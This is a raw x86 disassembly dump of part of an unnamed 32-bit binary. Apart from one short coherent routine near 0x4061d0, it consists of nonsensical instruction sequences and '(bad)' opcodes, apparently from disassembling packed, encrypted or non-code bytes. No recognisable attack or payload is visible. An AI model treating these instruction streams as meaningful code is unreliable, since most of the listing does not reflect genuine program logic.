  406124:	in     al,dx
  406125:	int    0x2c
  406127:	mov    ebx,0xc165691a
  40612c:	or     DWORD PTR [ecx-0x27],0xffffffe4
  406130:	cdq    
  406131:	clc    
  406132:	stos   DWORD PTR es:[edi],eax
  406133:	repz and esp,esp
  406136:	cmp    eax,0x8026f979
  40613b:	pop    bp
  40613d:	cdq    
  40613e:	or     al,0x43
  406140:	push   ebp
  406141:	es jmp 0x406170
  406144:	imul   BYTE PTR [esi+0x6358e052]
  40614a:	push   ds
  40614b:	ret    
  40614c:	mov    ah,0xcc
  40614e:	std    
  40614f:	adc    ch,BYTE PTR [ecx]
  406151:	adc    ch,BYTE PTR [ebp+0x71]
  406154:	retf   0xd4cc
  406157:	ins    BYTE PTR es:[edi],dx
  406158:	jle    0x40619c
  40615a:	pop    es
  40615b:	add    BYTE PTR [ecx-0x4d],ch
  40615e:	push   ss
  40615f:	sbb    al,0x74
  406161:	sbb    ebx,DWORD PTR [edi+0x6f]
  406164:	or     ecx,ebp
  406166:	mov    ebp,0xa6ad7dc2
  40616b:	adc    cl,BYTE PTR [edx-0x30]
  40616e:	std    
  40616f:	jne    0x406108
  406171:	sar    BYTE PTR [ecx+edi*4+0x5],0x2b
  406176:	(bad)  
  406178:	xchg   edi,eax
  406179:	push   ecx
  40617a:	cmp    DWORD PTR [esi-0x359382fb],ecx
  406180:	ins    DWORD PTR es:[edi],dx
  406181:	cmp    ebx,DWORD PTR [esi]
  406183:	sbb    al,0xad
  406185:	cmp    BYTE PTR cs:[eax+ebx*2-0x5],0x56
  40618b:	mov    ds:0xcd8b6cea,al
  406190:	pop    es
  406191:	or     ebp,ebp
  406193:	js     0x406214
  406195:	add    edx,0xc372e6fa
  40619b:	fisubr DWORD PTR [eax+0x3a]
  40619e:	adc    ch,BYTE PTR [eax]
  4061a0:	adc    eax,0x9c96a434
  4061a5:	sub    dh,cl
  4061a7:	mov    al,ds:0xc82f7472
  4061ac:	jle    0x4061be
  4061ae:	sbb    al,0x6e
  4061b0:	and    BYTE PTR [edi-0x46a6a774],cl
  4061b6:	pop    ecx
  4061b7:	ror    BYTE PTR [eax+0x72f61984],0x32
  4061be:	add    BYTE PTR [ebx-0x39ccf3bb],cl
  4061c4:	add    eax,edi
  4061c6:	pop    edi
  4061c7:	pop    esi
  4061c8:	pop    ebx
  4061c9:	leave  
  4061ca:	ret    0x8
  4061cd:	xor    eax,eax
  4061cf:	ret    
  4061d0:	push   ebp
  4061d1:	mov    ebp,esp
  4061d3:	sub    esp,0x38
  4061d6:	and    DWORD PTR ds:0x432ec7,0x0
  4061e0:	xor    eax,eax
  4061e2:	xor    eax,DWORD PTR ds:0x432ec7
  4061e8:	inc    eax
  4061e9:	mov    ds:0x432ec7,eax
  4061ee:	cmp    DWORD PTR ds:0x432ec7,0x24
  4061f5:	jg     0x406216
  4061fb:	jmp    0x406209
  406200:	push   DWORD PTR [ebp-0x18]
  406203:	call   DWORD PTR ds:0x43fdfb
  406209:	cmp    DWORD PTR ds:0x432ec7,0x19
  406210:	jb     0x4061e0
  406216:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  40621d:	push   ebx
  40621e:	mov    eax,ds:0x432e23
  406223:	adc    DWORD PTR ds:0x432e9f,eax
  406229:	jmp    0x4085d8
  40622e:	xchg   ebp,eax
  40622f:	(bad)
  406232:	xchg   edx,eax
  406233:	add    al,0x95
  406235:	(bad)
  406239:	stos   DWORD PTR es:[edi],eax
  40623a:	repnz pop ecx
  40623c:	dec    eax
  40623d:	out    dx,eax
  40623e:	or     edi,DWORD PTR ds:0x60f18383
  406244:	add    DWORD PTR [ebx+0x107e3d80],0xffffffc5
  40624b:	mov    eax,0x56da0bc
  406250:	std    
  406251:	pushf  
  406252:	xchg   ecx,eax
  406253:	cmp    al,0x82
  406255:	cdq    
  406256:	lea    edi,[ebx]
  406258:	cmp    al,0xaf
  40625a:	mov    edx,0xffe85980
  40625f:	cmc    
  406260:	jnp    0x406201
  406262:	or     edi,ecx
  406264:	push   esi
  406265:	mov    esp,0xdb35af7e
  40626a:	les    edx,FWORD PTR [edx]
  40626c:	outs   dx,DWORD PTR ds:[esi]
  40626d:	cmp    ch,dl
  40626f:	loopne 0x406210
  406271:	and    al,0x4
  406273:	mov    ah,BYTE PTR [esi-0x9b555bb]
  406279:	pop    eax
  40627a:	mov    ecx,0xe7b614b6
  40627f:	call   0x7ecf:0x4ba5f861
  406286:	xor    eax,0x1b74b56a
  40628b:	test   eax,0xc9b3c63f
  406290:	icebp  
  406291:	xor    ch,BYTE PTR [ebx]
  406293:	int3   
  406294:	sahf   
  406295:	or     al,0xd7
  406297:	and    esi,DWORD PTR [eax]
  406299:	dec    ebp
  40629a:	gs jmp 0xcc9a9fe2
  4062a0:	inc    eax
  4062a1:	lock sahf 
  4062a3:	and    eax,0xd0cdc78d
  4062a8:	fs pop es
  4062aa:	dec    edx
  4062ab:	dec    ecx
  4062ac:	jo     0x40632b
  4062ae:	mov    esp,0xfe50340a
  4062b3:	mov    ebx,0xb8068cd8
  4062b8:	clc    
  4062b9:	test   ah,bh
  4062bb:	sub    BYTE PTR [ebx*8+0x12e6c4fe],al
  4062c2:	(bad)  
  4062c3:	mov    WORD PTR [ebp-0x52188859],?
  4062c9:	stos   BYTE PTR es:[edi],al
  4062ca:	xchg   edi,eax
  4062cb:	(bad)  
  4062cc:	scas   al,BYTE PTR es:[edi]
  4062cd:	dec    ebp
  4062ce:	pop    ss
  4062cf:	pop    esp
  4062d0:	mov    ds:0xd305c5c0,al
  4062d5:	or     esp,DWORD PTR [eax+edi*4]
  4062d8:	xor    BYTE PTR [ecx],0xd
  4062db:	cmp    DWORD PTR [ebx+0x74b36a12],edx
  4062e1:	idiv   DWORD PTR [eax+0x35]
  4062e4:	test   DWORD PTR [ecx+0x6fcbe6da],eax
  4062ea:	inc    eax
  4062eb:	pop    ds
  4062ec:	leave  
  4062ed:	cmp    esi,edi
  4062ef:	(bad)  
  4062f0:	adc    al,0x42
  4062f2:	sub    ebp,0x845a386d
  4062f8:	imul   ebx,DWORD PTR [esi-0x44048bb8],0x12
  4062ff:	push   esp
  406300:	ficomp WORD PTR [eax+0xce2171f]
  406306:	retf   0x416b
  406309:	rol    DWORD PTR [edx],1
  40630b:	leave  
  40630c:	jecxz  0x40630f
  40630e:	push   0xffffff9f
  406310:	adc    bl,BYTE PTR [ecx]
  406312:	mov    BYTE PTR [edi-0xc4fc983],dh
  406318:	add    al,0x84
  40631a:	test   al,0x36
  40631c:	inc    ebp
  40631d:	dec    edi
  40631e:	ffreep st(0)
  406320:	sub    BYTE PTR [eax],dh
  406322:	jmp    0x2e09:0xf1d21735
  406329:	xchg   BYTE PTR [esi],ch
  40632b:	(bad)  
  40632c:	cmp    eax,DWORD PTR [edx-0x27e1919b]
  406332:	mov    esp,fs
  406334:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406336:	mov    ebp,edx
  406338:	add    al,0x74
  40633a:	mov    BYTE PTR [edx+0x4a6ab32c],bl
  406340:	fistp  QWORD PTR [ebx+0x4ad77256]
  406346:	mov    DWORD PTR [ecx+ebp*1],ebp
  406349:	jecxz  0x4063b3
  40634b:	inc    esp
  40634c:	call   0x751a95b1
  406351:	mov    eax,ds:0x38e95c44
  406356:	in     eax,dx
  406357:	adc    BYTE PTR [edi-0x596bb026],0x5c
  40635e:	add    al,0xbe
  406360:	push   esi
  406361:	pop    es
  406362:	cmp    al,0x71
  406364:	mov    cl,0xe3
  406366:	add    edx,ecx
  406368:	mov    WORD PTR [ebx-0x585e8094],?
  40636e:	rcr    DWORD PTR [eax],cl
  406370:	push   0x577c07e
  406375:	imul   eax,DWORD PTR [ebp+0x27f96544],0x80c27939
  40637f:	adc    BYTE PTR [esi+ecx*2+0x1c],al
  406383:	pop    eax
  406384:	scas   al,BYTE PTR es:[edi]
  406385:	das    
  406386:	inc    edi
  406387:	loop   0x4063a6
  406389:	ins    DWORD PTR es:[edi],dx
  40638a:	call   0xfef6120c
  40638f:	retf   
  406390:	xor    al,0xbc
  406392:	repnz pop ebp
  406394:	push   ds
  406395:	retf   
  406396:	lock cld 
  406398:	mov    dl,al
  40639a:	rol    DWORD PTR [edi-0x2a877e5],1
  4063a0:	inc    eax
  4063a1:	adc    esi,esi
  4063a3:	mov    eax,0x96633366
  4063a8:	push   esi
  4063a9:	bound  eax,QWORD PTR [ebx]
  4063ab:	mov    ah,0x3b
  4063ad:	mov    dl,0xca
  4063af:	(bad)  
  4063b0:	xor    bh,BYTE PTR [esi]
  4063b2:	imul   esp,DWORD PTR [edx-0x7618a885],0x5956e8e0
  4063bc:	stos   BYTE PTR es:[edi],al
  4063bd:	xor    bl,dh
  4063bf:	out    0x29,al
  4063c1:	out    0x2d,eax
  4063c3:	jge    0x40637a
  4063c5:	dec    esp
  4063c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063c7:	ins    DWORD PTR es:[edi],dx
  4063c8:	mov    ds:0x2c7fc158,al
  4063cd:	jge    0x40641b
  4063cf:	add    al,BYTE PTR [ecx]
  4063d1:	sti    
  4063d2:	aas    
  4063d3:	push   0xffffffea
  4063d5:	daa    
  4063d6:	xchg   ebp,eax
  4063d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063d8:	or     al,0xe1
  4063da:	call   0xd03a:0xb50d
  4063e0:	mov    eax,0xece7a27d
  4063e5:	push   0x718d68d1
  4063ea:	ds shl ebx,1
  4063ed:	mov    gs,WORD PTR [edx]
  4063ef:	sbb    DWORD PTR ds:0xee317c8c,edi
  4063f5:	push   ebx
  4063f6:	cmp    dl,al
  4063f8:	cmp    al,BYTE PTR [ecx+0x78]
  4063fb:	mov    dh,0xad
  4063fd:	fwait
  4063fe:	pop    eax
  4063ff:	dec    eax
  406400:	mul    DWORD PTR [edi-0x15]
  406403:	cs int 0x2b
  406406:	jbe    0x406431
  406408:	xchg   BYTE PTR [ebp+ebx*4-0x24],al
  40640c:	icebp  
  40640d:	xchg   DWORD PTR [edx+edi*2+0x3f1990ba],esi
  406414:	outs   dx,BYTE PTR ds:[esi]
  406415:	icebp  
  406416:	daa    
  406417:	(bad)  
  406418:	(bad)  
  40641a:	add    cl,BYTE PTR ds:0x459e98b0
  406420:	jbe    0x4063dc
  406422:	ficom  WORD PTR [ebx-0x6b]
  406425:	pop    ebp
  406426:	popa   
  406427:	adc    ch,bh
  406429:	clc    
  40642a:	inc    ecx
  40642b:	shr    cl,1
  40642d:	jmp    0x1749:0xb427c894
  406434:	jns    0x40647e
  406436:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406437:	clc    
  406438:	add    ecx,DWORD PTR [esi]
  40643a:	and    DWORD PTR [ecx],edi
  40643c:	outs   dx,DWORD PTR ds:[esi]
  40643d:	loopne 0x4064b3
  40643f:	retf   0x8b74
  406442:	xor    al,0x30
  406444:	psubusw mm1,mm0
  406447:	cdq    
  406448:	sub    bh,BYTE PTR [ebx]
  40644a:	js     0x40645e
  40644c:	sar    DWORD PTR [ebx-0x7be2337b],cl
  406452:	movhps QWORD PTR [ebx],xmm7
  406455:	mov    BYTE PTR [edi+0x26b3514d],cl
  40645b:	scas   al,BYTE PTR es:[edi]
  40645c:	je     0x40646e
  40645e:	iret   
  40645f:	add    al,0x46
  406461:	inc    edi
  406462:	dec    edx
  406463:	ret    
  406464:	loopne 0x406418
  406466:	fwait
  406467:	push   0x19
  406469:	and    al,0x56
  40646b:	shl    DWORD PTR [edx-0x5c751447],0xb3
  406472:	jmp    0x4064cc
  406474:	sub    BYTE PTR [edx+0x7591ad56],bh
  40647a:	push   edi
  40647b:	add    BYTE PTR [esi],0xaf
  40647e:	test   ebp,ebx
  406480:	add    edi,edx
  406482:	pop    ds
  406483:	(bad)  
  406484:	lock jne 0x4064aa
  406487:	das    
  406488:	xchg   esp,eax
  406489:	test   DWORD PTR [eax+0x3055e9c4],esi
  40648f:	pop    ebp
  406490:	cs mov bl,0x57
  406493:	aad    0xa
  406495:	out    dx,eax
  406496:	and    DWORD PTR [edi+esi*1+0x67cd0000],ebp
  40649d:	or     al,0x21
  40649f:	push   eax
  4064a0:	xchg   edx,eax
  4064a1:	xchg   BYTE PTR [eax+0x6ea8a5a6],dh
  4064a7:	cmp    cl,BYTE PTR [edi+0x5e]
  4064aa:	push   ds
  4064ab:	cmp    eax,0x2f0b2914
  4064b0:	push   esi
  4064b1:	stos   BYTE PTR es:[edi],al
  4064b2:	aam    0x7e
  4064b4:	push   ecx
  4064b5:	clc    
  4064b6:	push   es
  4064b7:	retf   
  4064b8:	push   edi
  4064b9:	pop    ecx
  4064ba:	call   0x60509b52
  4064bf:	cmp    eax,0x41be0c12
  4064c4:	jmp    0x406519
  4064c6:	and    BYTE PTR [edi],cl
  4064c8:	xor    DWORD PTR [esp+ebp*8+0x12227fb3],edi
  4064cf:	clc    
  4064d0:	xchg   ebx,eax
  4064d1:	aaa    
  4064d2:	add    eax,ecx
  4064d4:	jge    0x40650b
  4064d6:	dec    ebx
  4064d7:	xchg   ebx,eax
  4064d8:	rcl    BYTE PTR [esi+0xf4a1115],cl
  4064de:	pop    ebx
  4064df:	call   0xf6f5:0x1ba7deab
  4064e6:	inc    edx
  4064e7:	inc    edx
  4064e8:	jmp    0x8d6b:0xa03152fe
  4064ef:	fstp   QWORD PTR [eax+0x68]
  4064f2:	ss lock aaa 
  4064f5:	sahf   
  4064f6:	dec    ebp
  4064f7:	jp     0x406549
  4064f9:	or     esi,0xc3423b9f
  4064ff:	jno    0x40650d
  406501:	ret    0xdff9
  406504:	pop    eax
  406505:	or     eax,0xbfab08ba
  40650a:	mov    bl,0xb8
  40650c:	pop    ss
  40650d:	mov    esi,0x85387a5f
  406512:	and    cl,BYTE PTR [eax+ebp*8+0x34c1454d]
  406519:	sar    BYTE PTR [edx],0x80
  40651c:	jmp    0x1d39:0x489d20b4
  406523:	ja     0x4064e7
  406525:	lock push esi
  406527:	stc    
  406528:	dec    ebp
  406529:	iret   
  40652a:	mov    bh,0xea
  40652c:	stos   BYTE PTR es:[edi],al
  40652d:	dec    edx
  40652e:	or     cl,BYTE PTR [edi]
  406530:	xor    DWORD PTR [ebx],ecx
  406532:	aad    0xe5
  406534:	mov    edx,0x7fca0e24
  406539:	mov    WORD PTR [eax-0x58aac20f],es
  40653f:	cmc    
  406540:	mov    ds:0x73c41e5a,eax
  406545:	int3   
  406546:	push   esp
  406547:	(bad)  
  406548:	jmp    0x40656a
  40654a:	mov    ah,0x47
  40654c:	add    al,0xf0
  40654e:	fwait
  40654f:	lods   eax,DWORD PTR ds:[esi]
  406550:	push   0xffffffff
  406552:	aaa    
  406553:	push   ebp
  406554:	pop    es
  406555:	push   edx
  406556:	adc    bh,BYTE PTR [ecx]
  406558:	sbb    bh,BYTE PTR [ecx]
  40655a:	add    eax,0x36752fe2
  40655f:	mov    ds:0x8fcffd7f,eax
  406564:	add    DWORD PTR [esi*1-0x459df93],ebp
  40656b:	push   ds
  40656c:	lds    ebp,FWORD PTR [ecx+ebx*2]
  40656f:	fs xor eax,0xd0aa63d9
  406575:	test   bh,bh
  406577:	loope  0x40659c
  406579:	lods   eax,DWORD PTR ds:[esi]
  40657a:	add    DWORD PTR [ecx-0x12],edx
  40657d:	loop   0x4065c3
  40657f:	mov    esi,0x47afa83b
  406584:	mov    eax,ds:0x17548528
  406589:	inc    ebp
  40658a:	outs   dx,BYTE PTR ds:[esi]
  40658b:	cwde   
  40658c:	data16 cmp al,0x16
  40658f:	sub    BYTE PTR [eax+0x66add601],bh
  406595:	inc    ebp
  406596:	out    dx,eax
  406597:	jle    0x4065c5
  406599:	mov    ebx,0xaa2d8e3
  40659e:	(bad)  
  40659f:	mov    eax,0x90fdc996
  4065a4:	adc    eax,0x7b1c371d
  4065a9:	xchg   esp,eax
  4065aa:	scas   eax,DWORD PTR es:[edi]
  4065ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065ac:	push   ss
  4065ad:	fdiv   DWORD PTR [esi]
  4065af:	mov    edi,0xfffe9899
  4065b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065b5:	cmp    DWORD PTR [ebx-0x30],edi
  4065b8:	jnp    0x40662a
  4065ba:	popf   
  4065bb:	test   esp,ebx
  4065bd:	or     dl,BYTE PTR [ebx-0x53]
  4065c0:	data16 mov bl,0xb3
  4065c3:	and    BYTE PTR [ebx+0x4c0c87e6],dh
  4065c9:	jns    0x406550
  4065cb:	popa   
  4065cc:	push   ss
  4065cd:	or     al,0x79
  4065cf:	adc    al,0xb6
  4065d1:	addr16 push edi
  4065d3:	push   ebp
  4065d4:	adc    DWORD PTR [esi+0x43],eax
  4065d7:	xor    al,0x57
  4065d9:	pop    eax
  4065da:	cmp    dh,BYTE PTR [eax+0x4d75eeaf]
  4065e0:	repnz cmc 
  4065e2:	cmp    al,0x6b
  4065e4:	aam    0x3e
  4065e6:	inc    esi
  4065e7:	data16 xor al,0x4f
  4065ea:	in     eax,dx
  4065eb:	sbb    eax,0x61160734
  4065f0:	xchg   ebp,eax
  4065f1:	nop
  4065f2:	ins    BYTE PTR es:[edi],dx
  4065f3:	push   esi
  4065f4:	sub    BYTE PTR [ebx],bh
  4065f6:	(bad)  
  4065f7:	mov    ah,0xf8
  4065f9:	add    eax,0xf74d9520
  4065fe:	aam    0x53
  406600:	xchg   edx,eax
  406601:	scas   al,BYTE PTR es:[edi]
  406602:	inc    ecx
  406603:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406604:	mov    WORD PTR [ebx+ebx*4-0x4],ss
  406608:	pop    eax
  406609:	add    edx,esp
  40660b:	in     eax,0x58
  40660d:	inc    ecx
  40660e:	dec    esp
  40660f:	je     0x406674
  406611:	idiv   DWORD PTR [ecx+0x7d4ddaf8]
  406617:	xor    DWORD PTR [ebx+eax*1],0x5a9cb8fd
  40661e:	shl    DWORD PTR [eax+0x1d39d20e],1
  406624:	sti    
  406625:	and    DWORD PTR ds:0x3b769a60,esp
  40662b:	js     0x406639
  40662d:	mov    ds:0xa48dde90,al
  406632:	pop    eax
  406633:	cmp    DWORD PTR [edx-0x2b],ebp
  406636:	out    dx,eax
  406637:	or     al,0xaf
  406639:	aas    
  40663a:	stos   DWORD PTR es:[edi],eax
  40663b:	fs (bad) 
  40663d:	popa   
  40663e:	test   eax,0xe343c51d
  406643:	adc    DWORD PTR [esi+0x78],ebx
  406646:	dec    esi
  406647:	mov    BYTE PTR [ebp+0x3f],0xd9
  40664b:	dec    ebp
  40664c:	mov    esi,0x10616015
  406651:	push   ebp
  406652:	mov    dh,dl
  406654:	sub    ebx,DWORD PTR [edx-0x79]
  406657:	xchg   bl,cl
  406659:	inc    esp
  40665a:	loopne 0x40660d
  40665c:	inc    ecx
  40665d:	add    eax,0xea8f9d8a
  406662:	stos   DWORD PTR es:[edi],eax
  406663:	loop   0x406653
  406665:	ret    
  406666:	in     al,dx
  406667:	ins    BYTE PTR es:[edi],dx
  406668:	pop    edi
  406669:	mov    bl,BYTE PTR [ecx-0x17]
  40666c:	(bad)  
  40666d:	aam    0xac
  40666f:	ret    
  406670:	inc    al
  406672:	test   DWORD PTR [edi+0xa0d8fd5],ebx
  406678:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406679:	pop    ecx
  40667a:	mov    dh,0xdb
  40667c:	into   
  40667d:	loope  0x40667d
  40667f:	and    edi,esp
  406681:	inc    bx
  406683:	push   cs
  406684:	add    edx,ecx
  406686:	inc    ebp
  406687:	xchg   edi,eax
  406688:	push   0xffffffab
  40668a:	stos   BYTE PTR es:[edi],al
  40668b:	push   esi
  40668c:	sti    
  40668d:	cmc    
  40668e:	repnz mov ebx,0x3231fd89
  406694:	and    dh,ch
  406696:	loope  0x406654
  406698:	mov    cl,0xda
  40669a:	dec    BYTE PTR [eax+0x7d]
  40669d:	jbe    0x40669a
  40669f:	pcmpgtw mm2,QWORD PTR [ecx-0x3a89e96e]
  4066a6:	fsub   st(4),st
  4066a8:	mov    eax,0x871dab80
  4066ad:	in     al,0x1f
  4066af:	and    al,0xec
  4066b1:	xor    eax,0x621b21d5
  4066b6:	outs   dx,WORD PTR ds:[esi]
  4066b8:	pop    ds
  4066b9:	fild   DWORD PTR [edi+ebx*8-0x7e]
  4066bd:	fldcw  WORD PTR [edx-0x4c81d3a5]
  4066c3:	jl     0x4066dc
  4066c5:	sbb    ebp,edx
  4066c7:	pop    esp
  4066c8:	test   al,0x78
  4066ca:	into   
  4066cb:	xor    BYTE PTR [eax+0x3114b0ee],dh
  4066d1:	jb     0x4066e3
  4066d3:	outs   dx,DWORD PTR ds:[esi]
  4066d4:	out    dx,eax
  4066d5:	clc    
  4066d6:	dec    ecx
  4066d7:	test   edx,esp
  4066d9:	(bad)  
  4066da:	test   al,0x53
  4066dc:	aaa    
  4066dd:	not    DWORD PTR [edx+0x5cb0aa17]
  4066e3:	fadd   DWORD PTR [ebx+0x1cc12ec3]
  4066e9:	addr16 sub dh,dh
  4066ec:	sub    DWORD PTR [edi+0x3c03d2a7],ecx
  4066f2:	jmp    0x4066bb
  4066f4:	nop
  4066f5:	cmp    BYTE PTR [eax+0x7cc36b80],al
  4066fb:	pushf  
  4066fc:	jmp    0xa2ac:0xf42b14f
  406703:	stos   BYTE PTR es:[edi],al
  406704:	xchg   ch,bl
  406706:	repz je 0x406715
  406709:	hlt    
  40670a:	in     eax,0x1d
  40670c:	pop    esp
  40670d:	mov    eax,0xbb537848
  406712:	pop    esi
  406713:	mov    es,ecx
  406715:	out    dx,al
  406716:	mov    ah,0xab
  406718:	int3   
  406719:	cli    
  40671a:	add    eax,0x8c9728ff
  40671f:	push   0x52
  406721:	add    eax,0x54c5c45d
  406726:	ins    DWORD PTR es:[edi],dx
  406727:	outs   dx,DWORD PTR ds:[esi]
  406728:	out    0x74,eax
  40672a:	ffreep st(4)
  40672c:	xor    eax,ebx
  40672e:	imul   edi,DWORD PTR [ecx-0x1ae8d71a],0x32
  406735:	pop    eax
  406736:	aam    0x90
  406738:	ins    BYTE PTR es:[edi],dx
  406739:	(bad)
  40673c:	scas   eax,DWORD PTR es:[edi]
  40673d:	and    DWORD PTR [ebx-0x3e],edx
  406740:	mov    eax,0x8eb9b2d3
  406745:	jo     0x40672e
  406747:	outs   dx,BYTE PTR ds:[esi]
  406748:	cmc    
  406749:	and    eax,0xb1625198
  40674e:	call   0xad8f:0x5b301c80
  406755:	and    al,BYTE PTR [edx-0x29151aea]
  40675b:	out    0x3d,al
  40675d:	pop    edi
  40675e:	cmp    ebp,DWORD PTR [ebx-0x79]
  406761:	sbb    dl,dl
  406763:	add    bl,ch
  406765:	div    BYTE PTR [edx]
  406767:	jo     0x4066f9
  406769:	add    esp,esi
  40676b:	push   ebx
  40676c:	xor    eax,0x2e95cc7e
  406771:	xchg   ecx,eax
  406772:	mov    BYTE PTR [edx],0x50
  406775:	sbb    eax,0x2404afa8
  40677a:	int    0x1
  40677c:	jae    0x4067d1
  40677e:	int3   
  40677f:	shl    DWORD PTR [edi],0xb0
  406782:	test   DWORD PTR [ebx-0x4d],esi
  406785:	pop    ebx
  406786:	pop    ss
  406787:	jae    0x4067c4
  406789:	mov    ch,BYTE PTR [ebp+eiz*8-0x54a5e2fb]
  406790:	outs   dx,BYTE PTR ds:[esi]
  406791:	jg     0x40679c
  406793:	push   cs
  406794:	adc    BYTE PTR [edx+0x7a],0x1a
  406798:	mov    al,0xc4
  40679a:	adc    al,0x6e
  40679c:	pusha  
  40679d:	gs mov ebp,0x4ccf7871
  4067a3:	loopne 0x4067d8
  4067a5:	das    
  4067a6:	mov    bh,0x88
  4067a8:	push   0x2e
  4067aa:	sbb    eax,0xbfc27e56
  4067af:	xchg   ecx,eax
  4067b0:	stos   BYTE PTR es:[edi],al
  4067b1:	stos   BYTE PTR es:[edi],al
  4067b2:	int    0x6e
  4067b4:	mov    ds:0xd6e0fd3e,eax
  4067b9:	mov    ch,0xc9
  4067bb:	dec    esp
  4067bc:	pushf  
  4067bd:	shl    ecx,1
  4067bf:	loopne 0x40677e
  4067c1:	fistp  QWORD PTR [edx-0x70]
  4067c4:	jnp    0x40674a
  4067c6:	cli    
  4067c7:	and    al,0x9a
  4067c9:	or     esp,0x5a
  4067cc:	fwait
  4067cd:	jecxz  0x4067b4
  4067cf:	xor    edi,DWORD PTR [edi]
  4067d1:	fcmovu st,st(0)
  4067d3:	mov    ecx,0xa2b565ae
  4067d8:	push   ebx
  4067d9:	mov    ds:0x3f357277,al
  4067de:	pop    edx
  4067df:	iret   
  4067e0:	cld    
  4067e1:	xchg   edi,eax
  4067e2:	(bad)  
  4067e3:	call   0x793c:0xc7dc485e
  4067ea:	mov    esi,0xaeb22af3
  4067ef:	repz pop ebx
  4067f1:	jb     0x4067a8
  4067f3:	rcl    dl,cl
  4067f5:	iret   
  4067f6:	push   bp
  4067f8:	or     eax,0x7779a02e
  4067fd:	pop    ebx
  4067fe:	sub    BYTE PTR [eax-0x29],al
  406801:	adc    DWORD PTR [eax],edi
  406803:	popa   
  406804:	imul   esp,esi,0x7407a516
  40680a:	push   eax
  40680b:	(bad)  
  40680c:	(bad)  
  40680e:	mov    esi,0xbec14cd0
  406813:	inc    edx
  406814:	mov    DWORD PTR [eax-0xf5d4a0d],ebx
  40681a:	fwait
  40681b:	enter  0xaa07,0x96
  40681f:	xor    BYTE PTR [esp],bh
  406822:	dec    ecx
  406823:	fadd   DWORD PTR [ebp+0x51d6b7e8]
  406829:	inc    ecx
  40682a:	mov    bl,0x2b
  40682c:	popa   
  40682d:	xchg   edx,eax
  40682e:	pop    ds
  40682f:	jge    0x406877
  406831:	sub    al,0xa3
  406833:	in     al,0xeb
  406835:	and    bh,BYTE PTR [esi-0x77]
  406838:	cwde   
  406839:	mov    ch,0x12
  40683b:	push   0xffffffb1
  40683d:	fcomi  st,st(5)
  40683f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406840:	mov    al,0xb4
  406842:	add    eax,0xb8ffbb07
  406847:	xchg   esp,eax
  406848:	xchg   BYTE PTR [edx],cl
  40684a:	mov    dh,0x5a
  40684c:	mov    esi,0x424141bf
  406851:	mov    dl,BYTE PTR [edi-0x42]
  406854:	(bad)  
  406855:	mov    esp,0xf47804f9
  40685a:	enter  0x19e6,0xcc
  40685e:	std    
  40685f:	icebp  
  406860:	(bad)  
  406861:	sub    eax,0x37aad8b2
  406866:	rcr    BYTE PTR [eax],0x5b
  406869:	je     0x406826
  40686b:	dec    ecx
  40686c:	sbb    eax,0xcc2e4332
  406871:	in     al,dx
  406872:	mov    ebp,DWORD PTR [eax+0x4ce1ecce]
  406878:	add    ebp,edi
  40687a:	push   ebp
  40687b:	loop   0x40681c
  40687d:	dec    eax
  40687e:	aad    0x67
  406880:	ins    BYTE PTR es:[edi],dx
  406881:	xor    DWORD PTR [ebp+0x6],ecx
  406884:	cli    
  406885:	mov    ah,0xda
  406887:	xor    eax,DWORD PTR [ebp-0x24]
  40688a:	pop    esi
  40688b:	arpl   WORD PTR [ebx+0x71],cx
  40688e:	xchg   BYTE PTR [esi+ebp*2-0x42],bl
  406892:	mov    ecx,0x77152a0e
  406897:	mov    ah,0x18
  406899:	pop    bx
  40689b:	aaa    
  40689c:	imul   eax,DWORD PTR [eax+0x1a],0xc6c27ac
  4068a3:	js     0x4068b3
  4068a5:	xchg   esi,eax
  4068a6:	or     esp,0x1f
  4068a9:	and    BYTE PTR [ecx-0x60eccb3],dh
  4068af:	ins    BYTE PTR es:[edi],dx
  4068b0:	jle    0x4068d6
  4068b2:	fbstp  TBYTE PTR [ebp-0x11]
  4068b5:	pusha  
  4068b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068b7:	push   edx
  4068b8:	ins    DWORD PTR es:[edi],dx
  4068b9:	mov    cl,0x9
  4068bb:	push   cs
  4068bc:	inc    edi
  4068bd:	pop    esi
  4068be:	fld    st(0)
  4068c0:	cmp    BYTE PTR ds:0x40f554db,ah
  4068c6:	mov    dl,0x9b
  4068c8:	xchg   BYTE PTR [ebx-0x5c8af768],dl
  4068ce:	xchg   esp,eax
  4068cf:	mov    bl,0x62
  4068d1:	cmp    cl,bl
  4068d3:	dec    esi
  4068d4:	jmp    0x858fe676
  4068d9:	fsub   DWORD PTR [edi+0x2d062587]
  4068df:	push   0x57754b0e
  4068e4:	pop    edi
  4068e5:	test   eax,0xefceaedb
  4068ea:	add    ecx,DWORD PTR [edx-0x1613ba8a]
  4068f0:	pop    ecx
  4068f1:	cmp    al,0x95
  4068f3:	jecxz  0x4068df
  4068f5:	inc    edi
  4068f6:	das    
  4068f7:	jmp    0xa11cfff6
  4068fc:	dec    esi
  4068fd:	inc    esi
  4068fe:	pusha  
  4068ff:	sbb    eax,DWORD PTR [esp+eiz*2-0xe8e0591]
  406906:	jbe    0x406962
  406908:	jmp    0x5198:0x26268084
  40690f:	pop    eax
  406910:	pop    esi
  406911:	pop    edi
  406912:	mov    edi,DWORD PTR [ecx]
  406914:	fiadd  WORD PTR [ecx+0x1e]
  406917:	mov    BYTE PTR ds:0xef1f5924,cl
  40691d:	adc    DWORD PTR [ecx-0x59],esi
  406920:	xor    bl,BYTE PTR [edx-0x46]
  406923:	jle    0x406982
  406925:	enter  0x9dab,0x6f
  406929:	push   esi
  40692a:	or     dl,BYTE PTR [ebp-0x39]
  40692d:	lds    ebx,FWORD PTR [edx]
  40692f:	pmulhuw mm4,QWORD PTR [edx+0x4de70a45]
  406936:	int3   
  406937:	and    al,0x97
  406939:	inc    esp
  40693a:	mov    BYTE PTR [ebp+0x48a4a1a],ch
  406940:	sub    al,0xc5
  406942:	jl     0x406995
